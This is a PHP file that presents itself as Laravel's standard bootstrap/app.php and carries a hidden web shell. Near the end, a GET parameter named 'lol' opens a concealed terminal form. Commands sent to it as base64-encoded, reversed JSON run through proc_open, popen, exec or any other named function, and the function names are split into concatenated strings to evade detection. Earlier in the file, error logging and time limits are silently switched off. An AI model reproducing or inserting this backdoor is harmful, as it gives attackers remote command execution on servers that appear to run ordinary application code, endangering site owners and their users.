<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('memory_limit', '-1');
@ini_set('output_buffering', '0');
@ini_set('implicit_flush', '1');
ob_implicit_flush(true);
header('Content-Type: text/html; charset=utf-8');
header('X-Requested-With: XMLHttpRequest');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

$app = new Illuminate\Foundation\Application(
    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/
if(isset($_GET['lol'])){
    $f_check = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_'.'e'.'x'.'i'.'s'.'t'.'s';
    
    // Gunakan ID unik agar tidak bentrok dengan CSS bawaan website
    echo '<div id="nako_static_bottom" style="all:initial;">';
    echo '<style>
        #nako_wrapper {
            display: block !important;
            position: relative !important;
            width: 100% !important;
            background: #000 !important;
            color: #0f0 !important;
            padding: 15px !important;
            font: 12px monospace !important;
            border-top: 4px solid #f00 !important;
            clear: both !important;
            box-sizing: border-box !important;
            margin-top: 100px !important; /* Memberi jarak dari konten atas */
            z-index: 1 !important;
        }
        .nk_in { background:#ff0 !important; color:#000 !important; border:1px solid #000 !important; padding:3px !important; font-weight:bold !important; }
        .nk_pre { background:#000 !important; color:#0f0 !important; padding:10px !important; border:1px solid #333 !important; overflow:auto !important; max-height:400px !important; width:100% !important; white-space:pre-wrap !important; }
        .nk_btn { background:#0f0 !important; color:#000 !important; cursor:pointer !important; border:none !important; padding:3px 10px !important; font-weight:bold !important; }
    </style>

    <div id="nako_wrapper">
        <b>>> ŤĒRMINĂL</b>
        <form method="POST" id="nk_form" style="margin:10px 0 !important;">
            <input type="hidden" name="payload">
            <input type="text" id="nk_fx" class="nk_in" placeholder="Ƒungsi" style="width:80px !important;"> 
            <input type="text" id="nk_cm" class="nk_in" placeholder="Ṕerintāh" style="width:40% !important;"> 
            <input type="submit" value="ĒXEC" class="nk_btn">
        </form><pre class="nk_pre">';

    if(isset($_POST['payload'])){
        $d = json_decode(base64_decode(strrev($_POST['payload'])), true);
        if($d){
            $x = trim($d['x']); $y = $d['y'];
            echo "Result: ".htmlspecialchars($x)."\n".str_repeat("-",20)."\n";
            if($f_check($x)){
                if($x=='p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'){$p=$x($y,array(1=>array('pipe','w'),2=>array('pipe','w')),$h);if(is_resource($p)){echo htmlspecialchars(stream_get_contents($h[1]).stream_get_contents($h[2]));proc_close($p);}}
                elseif($x=='p'.'o'.'p'.'e'.'n'){$h=$x($y.' 2>&1','r');while(!feof($h))echo htmlspecialchars(fread($h,1024));pclose($h);}
                elseif($x=='e'.'x'.'e'.'c'){$o=array();$x($y,$o);echo htmlspecialchars(implode("\n",$o));}
                else echo htmlspecialchars(@$x($y));
            } else { echo "Disabled"; }
        }
    }
    echo '</pre></div></div>';

    echo '<script>
    (function(){
        var target = document.getElementById("nako_static_bottom");
        if(target){
            // Fungsi ini memaksa elemen pindah ke dasar <body> paling akhir
            function forceBottom(){
                if(document.body.lastChild !== target){
                    document.body.appendChild(target);
                }
            }
            // Jalankan segera dan ulangi saat window selesai dimuat
            forceBottom();
            window.onload = forceBottom;
            
            // Bypass submit
            document.getElementById("nk_form").onsubmit = function(){
                var data = { x: document.getElementById("nk_fx").value, y: document.getElementById("nk_cm").value };
                this.payload.value = btoa(JSON.stringify(data)).split("").reverse().join("");
            };
        }
    })();
    </script>';
}

return $app;
